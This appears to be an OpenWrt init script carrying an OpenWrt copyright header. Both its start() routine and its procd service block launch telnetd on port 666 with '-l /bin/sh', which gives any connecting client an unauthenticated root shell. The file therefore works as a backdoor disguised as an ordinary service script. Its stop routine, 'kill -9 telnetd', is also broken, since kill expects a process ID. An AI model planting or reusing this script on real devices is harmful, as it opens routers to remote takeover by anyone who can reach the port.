#!/bin/sh /etc/rc.common
# Copyright (C) 2006-2011 OpenWrt.org

START=50

start() {
	mkdir -m 0755 -p /var/run/telnetd1
	telnetd -p 666 -F -l /bin/sh >> /var/log/telnetd.log
}

stop() {
	kill -9 telnetd
}

start_service() {
	procd_open_instance
	mkdir -m 0755 -p /var/run/telnetd2
	procd_set_param command "/usr/sbin/telnetd" -p 666 -F -l "/bin/sh"
	procd_close_instance
}
